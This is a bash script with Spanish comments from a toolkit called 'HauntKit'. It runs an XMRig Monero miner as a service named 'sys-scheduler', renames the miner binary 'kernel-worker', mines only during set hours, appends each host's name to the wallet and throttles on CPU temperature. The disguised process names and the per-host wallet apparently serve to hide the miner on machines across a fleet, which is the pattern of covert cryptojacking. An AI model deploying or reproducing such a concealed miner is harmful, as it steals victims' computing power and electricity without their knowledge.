#!/bin/bash
# ════════════════════════════════════════════════════════
#  HauntKit — Servicio de Minería (sys-scheduler)
#  Controla XMRig con horarios inteligentes
#  Solo mina entre START_HOUR y END_HOUR (hora Colombia)
# ════════════════════════════════════════════════════════

# ─── Configuración ───
HAUNTKIT_DIR="/opt/hauntkit"
CONFIG="$HAUNTKIT_DIR/mine-config.env"
XMRIG_DIR="$HAUNTKIT_DIR/xmrig"
XMRIG_BIN="$XMRIG_DIR/kernel-worker"
XMRIG_LOG="$XMRIG_DIR/miner.log"
PID_FILE="$XMRIG_DIR/miner.pid"
TZ="America/Bogota"

# ─── Cargar configuración ───
if [ -f "$CONFIG" ]; then
    source "$CONFIG"
else
    echo "[ERROR] No se encuentra $CONFIG"
    exit 1
fi

# ─── Construir wallet completo con hostname ───
FULL_WALLET="${WALLET_BASE}.$(hostname)"

# ─── Función: ¿Estamos en hora permitida? ───
is_allowed_hour() {
    local hour
    hour=$(TZ=$TZ date +%-H)
    [ "$hour" -ge "$START_HOUR" ] || [ "$hour" -lt "$END_HOUR" ]
}

# ─── Función: ¿El minero está vivo? ───
is_miner_alive() {
    [ -f "$PID_FILE" ] && kill -0 "$(cat "$PID_FILE")" 2>/dev/null
}

# ─── Función: Iniciar minero ───
start_miner() {
    is_miner_alive && return 0

    local threads=""
    [ "$THREADS" -gt 0 ] && threads="-t $THREADS"

    mkdir -p "$XMRIG_DIR"
    cd "$XMRIG_DIR" || return 1

    nohup "$XMRIG_BIN" $threads \
        -o "$POOL_URL" \
        -u "$FULL_WALLET" \
        -p "x" \
        --cpu-max-threads-hint="$MAX_CPU" \
        --donate-level=0 \
        --keepalive \
        >> "$XMRIG_LOG" 2>&1 &

    echo $! > "$PID_FILE"
    echo "[$(TZ=$TZ date '+%F %T')] Minero iniciado (PID $!)" >> "$XMRIG_LOG"
}

# ─── Función: Detener minero ───
stop_miner() {
    if is_miner_alive; then
        local pid
        pid=$(cat "$PID_FILE")
        kill "$pid" 2>/dev/null
        sleep 2
        kill -0 "$pid" 2>/dev/null && kill -9 "$pid" 2>/dev/null
        rm -f "$PID_FILE"
        echo "[$(TZ=$TZ date '+%F %T')] Minero detenido" >> "$XMRIG_LOG"
    fi
}

# ─── Función: Verificar temperatura ───
check_temp() {
    [ "$MAX_TEMP" -eq 0 ] && return 0
    local temp
    if command -v sensors &>/dev/null; then
        temp=$(sensors -u 2>/dev/null | grep -m1 'temp1_input' | awk '{print $2}' | cut -d. -f1)
        [ -z "$temp" ] && return 0
        [ "$temp" -ge "$MAX_TEMP" ] && return 1
    fi
    return 0
}

# ─── Limpieza al salir ───
cleanup() {
    echo "[$(TZ=$TZ date '+%F %T')] Servicio deteniéndose..." >> "$XMRIG_LOG"
    stop_miner
    exit 0
}
trap cleanup SIGTERM SIGINT SIGHUP

# ─── Bucle principal ───
echo "[$(TZ=$TZ date '+%F %T')] Servicio iniciado. Horario: $START_HOUR:00 a $END_HOUR:00" >> "$XMRIG_LOG"

while true; do
    if is_allowed_hour; then
        if ! check_temp; then
            echo "[$(TZ=$TZ date '+%F %T')] Temperatura alta, deteniendo..." >> "$XMRIG_LOG"
            stop_miner
            sleep 120  # Esperar 2 min antes de reintentar
            continue
        fi
        start_miner
    else
        stop_miner
    fi
    sleep 60  # Verificar cada minuto
done
